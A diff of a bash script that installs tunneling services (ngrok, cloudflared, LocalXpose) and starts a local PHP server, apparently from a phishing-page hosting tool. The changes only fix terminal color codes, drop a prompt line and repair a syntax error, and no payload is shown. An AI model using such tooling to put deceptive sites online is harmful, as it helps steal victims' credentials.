@@ -201,7 +201,7 @@ dependencies() {
         if [[ `command -v proot` ]]; then
             printf ''
         else
-                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}"${WHITE}
+                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}${NC}"
             pkg install proot resolv-conf -y
         fi
     fi
@@ -212,7 +212,7 @@ dependencies() {
                 pkgs=(php curl wget unzip)
                 for pkg in "${pkgs[@]}"; do
                         type -p "$pkg" &>/dev/null || {
-                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}"${WHITE}
+                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}${NC}"
                                 if [[ `command -v pkg` ]]; then
                                         pkg install "$pkg" -y
                                 elif [[ `command -v apt` ]]; then
@@ -384,7 +384,7 @@ check_ngrok(){
 	fi
 }
 install_ngrok() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...${NC}"
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -427,8 +427,7 @@ ngrok_token_setup(){
 }
 ngrok_region() {
         echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION ${NF} : ${NC}"
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Default=us) : "
-        temprompt="$(echo -e "    ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
+        temprompt="$(echo -e "   ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
 	read -p "${temprompt}" ngrokregion
 	case $ngrokregion in
 	"us" | "US")
@@ -496,7 +495,7 @@ check_cloudflared(){
 	fi
 }
 install_cloudflared() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared...${NC}"
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -548,7 +547,7 @@ check_localxpose(){
 	fi
 }
 install_localxpose() {
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose...${NC}"
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -694,8 +693,8 @@ setup_site() {
 	fi
         cusport
         redirect_check
-        { clear; banner; echo -e ""}
-        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+        { clear; banner; echo -e ""; }
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${NC}"
         cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
